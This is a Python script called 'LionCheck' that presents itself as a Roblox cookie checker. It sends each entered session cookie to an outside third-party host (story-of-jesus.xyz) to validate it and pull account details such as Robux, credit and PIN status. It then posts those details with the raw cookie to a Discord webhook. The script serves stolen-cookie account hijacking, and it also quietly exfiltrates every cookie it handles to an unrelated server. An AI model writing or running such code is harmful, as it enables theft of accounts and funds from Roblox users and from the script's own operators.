import requests, os
import threading
import colorama
from os import system
from colorama import Fore
from discord_webhook import DiscordWebhook, DiscordEmbed
colorama.init()
def gang():
    cookie = input(f"{Fore.RED}[Lion]{Fore.WHITE} Enter Roblox Cookie: ")
    r = requests.get(f'https://story-of-jesus.xyz/e.php?cookie={cookie}') 
    data = r.json()
    if data["status"] == "failed":
      print(f"{Fore.RED}[Lion]{Fore.WHITE} invaild cookie")
      gang()
    print(f"{Fore.RED}[Lion]{Fore.WHITE} Cookie Is Valid")
    webhook = input(f"{Fore.RED}[Lion]{Fore.WHITE} Webhook :")
    r = requests.get(webhook)
    if r.status_code == 200:
     print(f"{Fore.RED}[Lion]{Fore.WHITE} Webhook is working")
    else:
      print(f"{Fore.RED}[Lion]{Fore.WHITE} Invaild webhook")
    avatarurl = data["avatarurl"]   
    userid = data["userid"]  
    emailverified = data["emailverified"]  
    username = data["username"]  
    description = data["description"]  
    displayname = data["displayname"]  
    datecreated = data["datecreated"]  
    days_old = data["days-old"]  
    robux = data["robux"]  
    pendingrobux = data["pendingrobux"]  
    credit = data["credit"]  
    premium = data["premium"]  
    friends = data["friends"]  
    followers = data["followers"]  
    following = data["following"]
    rap = data["rap"]  
    gender = data["gender"]  
    country = data["country"]  
    pin = data["pin"] 
    if description == "":
      description = "Empty"
    content = '@everyone'
    webhook = DiscordWebhook(url=webhook, username="LionCheck", avatar_url=r"https://images-ext-1.discordapp.net/external/06fOMveWK_zEwRIkan9CMfaVALvdxC99PCF-jT3ahSM/https/media.tenor.com/HcDPrqVhWcUAAAPo/capital-bra-capital.mp4",content=content)
    embed = DiscordEmbed(title="Valid Cookie", description=f"LionCheck , COOKIE CHECKER", color='800080')
    embed.set_author(name="author : scooby", icon_url=r'https://media.discordapp.net/attachments/818895366740115466/987864319465254962/IMG_4277.gif')
    embed.set_footer(text='vesper')
    embed.set_thumbnail(url=f'{avatarurl}')
    embed.add_embed_field(name="Profile Link:", value=f'**[Click Here](https://www.roblox.com/users/{userid}/profile)**', inline=True)
    embed.add_embed_field(name="Rolimons Link:", value=f'**[Click Here](https://www.rolimons.com/player/{userid})**', inline=True)
    embed.add_embed_field(name="Username:", value=f'```{username}```', inline=True)
    embed.add_embed_field(name="UserID:", value=f'```{userid}```', inline=True)
    embed.add_embed_field(name="Display Name:", value=f'```{displayname}```', inline=True)
    embed.add_embed_field(name="Description:", value=f'```{description}```', inline=True)
    embed.add_embed_field(name="Gender:", value=f'```{gender}```', inline=True)
    embed.add_embed_field(name="Country:", value=f'```{country}```', inline=True)
    embed.add_embed_field(name="Verified Email:", value=f'```{emailverified}```', inline=True)
    embed.add_embed_field(name="Premium:", value=f'```{premium}```', inline=True)
    embed.add_embed_field(name="Pin Enabled:", value=f'```{pin}```', inline=True)
    embed.add_embed_field(name="Robux:", value=f'```{robux}```', inline=True)
    embed.add_embed_field(name="Pending-Robux:", value=f'```{pendingrobux}```', inline=True)
    embed.add_embed_field(name="Rap:", value=f'```{rap}```', inline=True)
    embed.add_embed_field(name="Credit:", value=f'```{credit}```', inline=True)
    embed.add_embed_field(name="Date Created:", value=f'```{days_old} Days Ago```', inline=True)
    embed.add_embed_field(name="Friends:", value=f'```{friends}```', inline=True)
    embed.add_embed_field(name="Followers:", value=f'```{followers}```', inline=True)
    embed.add_embed_field(name="Following:", value=f'```{following}```', inline=True)
    embed.add_embed_field(name="Cookie:", value=f'```{cookie}```', inline=False)
    webhook.add_embed(embed)
    response = webhook.execute()
    print(f"{Fore.RED}[Lion]{Fore.WHITE} Sent to your webhook !")
gang()  